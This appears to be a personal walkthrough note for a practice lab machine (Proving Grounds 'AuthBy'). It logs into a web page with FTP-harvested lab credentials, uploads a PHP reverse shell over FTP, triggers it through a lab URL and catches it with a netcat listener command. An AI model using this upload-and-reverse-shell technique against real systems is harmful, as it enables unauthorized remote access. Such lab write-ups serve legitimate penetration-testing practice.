We have a webpage and it asks for authentication![](../attachment/a0e0e4bd7f008daef368d609d37e9bb6.png)

Now using the credentials obtained from ftp at [[PG Practice/AuthBy/21]]

We can login to the webpage:
offsec:elite

Now we can see the page. It is the same as the *index.php* file in ftp

So we can try to put a text file and check if it is accessible
```
echo "This is a test" > test.txt
```
Now in ftp:
```
put test.txt
```

It uploaded

Now we can try to access this file in the webpage![](../attachment/cffa20ea72194f7ca6a0ffc8eabe3190.png)
It works.

We can now try putting a php reverse shell. Go to revshells.com and get a reverse shell:
![](../attachment/05e9f7cb59c622660f7878489ed33d52.png)
We can save this in *php-reverse-shell.php* file

And now upload in ftp:
```
put php-reverse-shell.php
```
and access it in browser:
http://192.168.164.46:242/php-reverse-shell.php

We get a shell:
```
rlwrap nc -nlvp 3389
```
